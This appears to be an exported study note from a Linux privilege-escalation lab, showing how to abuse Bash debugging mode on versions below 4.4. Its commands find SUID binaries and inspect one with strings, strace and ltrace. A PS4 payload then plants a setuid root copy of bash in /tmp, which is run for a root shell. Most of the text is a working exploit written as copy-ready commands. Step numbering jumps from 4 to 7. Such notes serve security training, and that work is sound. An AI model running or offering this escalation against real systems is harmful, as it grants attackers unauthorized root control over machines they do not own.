<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Abusing Shell Features(Debugging mode)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Abusing Shell Features(Debugging mode)</h1><br/><strong>Prerequisite:</strong><br />   ◇ Bash version lower than 4.4 excluded<br /><br />• Bash has a debugging mode which can be enabled with the -x command line option, or by modifying the SHELLOPTS environment variable to include xtrace.<br />• By default, SHELLOPTS is read only, however the env command allows SHELLOPTS to be set.<br />• When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debug statements. This variable can include an embedded command, which will execute every time it is shown.<br />   ◇ In Bash versions 4.4 and above, the PS4 environment variable is not inherited by shells running as root.<br /><br />• If a SUID file runs another program via Bash (e.g. by using system() ) these environment variables can be inherited.<br />• If an SUID file is being executed, this command will execute with the privileges of the file owner.<br /><br />1. manually locate <span style="color:#1e90ff;">files</span> with the SUID or SGID bits set:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">find</span> <span style="color:#ff9d00;font-weight:700">/</span> -type f -a <span style="color:#333333;font-weight:400">\(</span> -perm -u+s -o -perm -g+s <span style="color:#333333;font-weight:400">\)</span> -exec <span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">{}</span> <span style="color:#333333;font-weight:400">\;</span> 2&gt; <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>null</pre></div><br />    <a href=""><img src="images/1310-1.png" alt="images/1310-1.png" /></a><br />    <a href=""><img src="images/1310-2.png" alt="images/1310-2.png" /></a><br />2. Run strings on the S<span style="color:#1e90ff;">U</span>ID file:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ strings <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-env2</pre></div><br />    <a href=""><img src="images/1310-3.png" alt="images/1310-3.png" /></a><br />    This time the <span style="color:#ff8700;">service</span>(apache2) run with an absolute path <br />3. We can verify this <br />   ◇ with <span style="text-decoration:underline;">strace</span>:<br />       <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ strace -v -f -e execve <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-env2 <span style="color:#ff9d00;font-weight:700">2&gt;&amp;</span>1 <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> service</pre></div><br />       <a href=""><img src="images/1310-4.png" alt="images/1310-4.png" /></a><br />   ◇ with <span style="text-decoration:underline;">ltrace</span>:<br />        <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ ltrace <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-env2 <span style="color:#ff9d00;font-weight:700">2&gt;&amp;</span>1 <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> service</pre></div><br />        <a href=""><img src="images/1310-5.png" alt="images/1310-5.png" /></a><br />        This reveals that the system function is being used to execute the /usr/local/bin/suid-env2  <span style="color:#ff9d00;">service</span> program(apache2)<br />4. Run the <span style="color:#1e90ff;">SUID file</span> with bash debugging enabled and the PS4 variable assigned to our payload.<br />    This because bash versions lower than 4.4 inherit the PS4 environment variable when running as root. The PS4 environment variable is used to display the prompt while bash debugging mode is on. <br />    The PS4 environment variable will be pre-pended to each line of the output<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">env</span> -i SHELLOPTS=xtrace PS4=<span style="color:#3ad900;font-weight:400">&#39;$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)&#39;</span> <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>local<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>suid-env2</pre></div><br />    <a href=""><img src="images/1310-6.png" alt="images/1310-6.png" /></a><br />7. Run the /tmp/rootbash file with the -p command line option to get a root shell:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>rootbash -p</pre></div><br />    <a href=""><img src="images/1310-7.png" alt="images/1310-7.png" /></a></div>
</body>
</html>
